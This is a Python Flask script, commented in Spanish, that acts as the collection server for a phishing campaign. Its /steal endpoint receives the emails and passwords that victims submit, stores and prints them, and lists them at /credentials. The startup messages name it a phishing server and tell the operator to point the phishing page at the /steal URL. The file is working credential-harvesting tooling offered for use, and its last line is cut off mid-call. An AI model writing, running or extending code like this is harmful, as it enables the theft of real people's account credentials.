from flask import Flask, request, jsonify
import socket
import threading

app = Flask(__name__)

# Variable para almacenar las credenciales capturadas
captured_credentials = []

def get_local_ip():
    """Obtiene la dirección IP local del servidor"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # No necesita estar conectado realmente
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

@app.route('/steal', methods=['POST'])
def steal_credentials():
    """Endpoint para recibir las credenciales"""
    data = request.get_json()
    email = data.get('email', '')
    password = data.get('password', '')
    
    # Almacenar las credenciales
    captured_credentials.append((email, password))
    
    print(f"\n[+] Credenciales capturadas - Email: {email} | Contraseña: {password}\n")
    
    return jsonify({"status": "success"}), 200

@app.route('/credentials', methods=['GET'])
def show_credentials():
    """Endpoint para mostrar las credenciales capturadas"""
    return jsonify(captured_credentials), 200

def run_server(port=5000):
    """Inicia el servidor Flask"""
    ip = get_local_ip()
    print(f"\n[+] Servidor de phishing iniciado en http://{ip}:{port}")
    print("[+] Esperando credenciales...\n")
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    # Configuración del puerto (puedes cambiarlo)
    PORT = 5000
    
    # Mostrar información de conexión
    local_ip = get_local_ip()
    print(f"\n[+] Configura la página de phishing con esta dirección:")
    print(f"[+] URL para el script: http://{local_ip}:{PORT}/steal\n")
    
    # Iniciar el servidor
    run_server(port=PORT
